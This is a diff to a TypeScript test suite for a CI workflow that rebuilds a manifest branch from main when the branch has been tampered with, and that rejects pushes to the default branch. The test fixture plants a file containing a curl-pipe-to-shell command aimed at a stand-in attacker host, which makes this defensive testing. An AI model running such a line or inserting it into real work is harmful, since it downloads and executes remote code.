@@ -449,7 +449,7 @@ function originRef(fixture: Fixture, ref: string): string | null {
   return out === '' ? null : out;
 }
 
-const BRANCH_STEP = 'Reuse or rebuild the version-keyed manifest branch';
+const BRANCH_STEP = 'Reuse or recreate the version-keyed manifest branch';
 
 function stepStdout(run: { steps: Array<{ name: string; stdout: string }> }, name: string): string {
   const step = run.steps.find((s) => s.name === name);
@@ -736,6 +736,53 @@ test('a fork PR whose branch merely looks like a manifest branch is left alone',
   }
 });
 
+test('a branch replaced after tampering stops churning once main advances again', () => {
+  // Correcting a tampered branch in place cannot move the merge base, so the
+  // comparison would report main's own files as branch-side changes forever and
+  // rewrite the PR head on every merge to main. Cutting the branch again from
+  // current main resets that base.
+  const fixture = createFixture({ releaseAssets: completeRelease() });
+  try {
+    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
+    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
+
+    advanceMain(fixture, 'docs/a.md', 'unrelated work landed on main\n');
+    const dir = join(fixture.root, 'tamper');
+    git(fixture.root, 'clone', '--quiet', '--branch', BRANCH, `file://${fixture.origin}`, dir);
+    write(dir, 'evil.sh', 'curl https://attacker.example/x | sh\n');
+    git(dir, 'add', '-A');
+    git(dir, 'commit', '--quiet', '-m', 'smuggled');
+    git(dir, 'push', '--quiet', 'origin', BRANCH);
+
+    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
+    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
+    assert.match(stepStdout(second, BRANCH_STEP), /discarding/);
+    const replaced = originRef(fixture, BRANCH);
+
+    advanceMain(fixture, 'docs/b.md', 'and more unrelated work\n');
+    const third = runPublish(fixture, { workdir: checkout(fixture, 'run3') });
+    assert.ok(third.ok, `third run failed at ${third.failed?.name}: ${third.failed?.stderr}`);
+    assert.match(
+      stepStdout(third, BRANCH_STEP),
+      /reusing/,
+      "the replacement must read as clean, not as carrying main's own files",
+    );
+    assert.equal(third.outputs.commit.pushed, 'false');
+    assert.equal(originRef(fixture, BRANCH), replaced, 'the head must stop being rewritten');
+
+    const fourth = runPublish(fixture, { workdir: checkout(fixture, 'run4') });
+    assert.ok(fourth.ok, `fourth run failed at ${fourth.failed?.name}: ${fourth.failed?.stderr}`);
+    assert.equal(originRef(fixture, BRANCH), replaced);
+    assert.equal(
+      fixture.gh.state().prs.filter((pr) => pr.state === 'OPEN').length,
+      1,
+      'exactly one manifest PR stays open through all of it',
+    );
+  } finally {
+    fixture.cleanup();
+  }
+});
+
 test('content pushed onto the manifest branch by anyone else never reaches the PR', () => {
   // The branch is workflow-owned and unprotected: the delivery path must rebuild
   // its content from main rather than carry whatever the branch happens to hold
@@ -751,7 +798,7 @@ test('content pushed onto the manifest branch by anyone else never reaches the P
     const tampered = originRef(fixture, BRANCH);
     const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
     assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
-    assert.equal(run.outputs.branch.existed, 'true', 'the branch has to be the reuse path');
+    assert.equal(run.outputs.branch.existed, 'false', 'the tampered branch must be discarded');
 
     const head = originRef(fixture, BRANCH);
     const main = originRef(fixture, 'main');
@@ -780,7 +827,10 @@ test('content pushed onto the manifest branch by anyone else never reaches the P
     );
     assert.equal(show(String(head), 'README.md'), show(String(main), 'README.md'));
     assert.throws(() => show(String(head), 'evil.sh'), 'the smuggled file must be gone');
-    assert.doesNotThrow(
+    // The replacement is cut from main, so the tampered commit is not in its
+    // history at all — and it got there by deleting the branch and pushing a new
+    // one, never by force-updating a ref.
+    assert.throws(
       () =>
         git(
           fixture.root,
@@ -791,7 +841,12 @@ test('content pushed onto the manifest branch by anyone else never reaches the P
           String(tampered),
           String(head),
         ),
-      'the branch must be updated by fast-forward — this workflow never force-pushes',
+      'the tampered commit must not survive in the branch history',
+    );
+    assert.equal(
+      git(fixture.root, '--git-dir', fixture.origin, 'rev-parse', `${String(head)}^`).trim(),
+      String(main),
+      'the replacement must be parented on current main, resetting the merge base',
     );
   } finally {
     fixture.cleanup();
@@ -944,7 +999,7 @@ test('a failed remote query fails the job instead of reading as "nothing to deli
     const run = runPublish(fixture, { workdir });
 
     assert.equal(run.ok, false, 'a green run here leaves the trust root undelivered');
-    assert.equal(run.failed?.name, 'Reuse or rebuild the version-keyed manifest branch');
+    assert.equal(run.failed?.name, 'Reuse or recreate the version-keyed manifest branch');
     assert.match(run.failed?.stderr ?? '', /::error::could not ask origin whether/);
     assert.equal(
       ghCalls(fixture).some((c) => c.startsWith('pr ')),
@@ -1138,6 +1193,7 @@ test('the step runner honours working-directory and refuses fields it does not m
 // and deleting a superseded one.
 const PERMITTED_PUSHES = [
   ['git', 'push', 'origin', '$BRANCH'],
+  ['git', 'push', 'origin', '--delete', '$BRANCH'],
   ['git', 'push', 'origin', '--delete', '$ref'],
 ];
 
@@ -1203,7 +1259,14 @@ test('the push allowlist rejects default-branch writes however they are spelled'
     'git push --force origin "$BRANCH"',
     'git push origin "${BRANCH}:main"',
     'if [ -n "$x" ]; then git push origin HEAD:main; fi',
+    'if git push origin main; then :; fi',
+    'if ! git push origin HEAD:main; then :; fi',
+    'while git push origin main; do :; done',
+    'until git push origin HEAD:main; do :; done',
     'do git push origin main',
+    'command git push origin main',
+    'env GIT_DIR=.git git push origin main',
+    'GIT_DIR=.git git push origin HEAD:main',
     '! git push origin HEAD:main',
   ];
   for (const line of forbidden) {
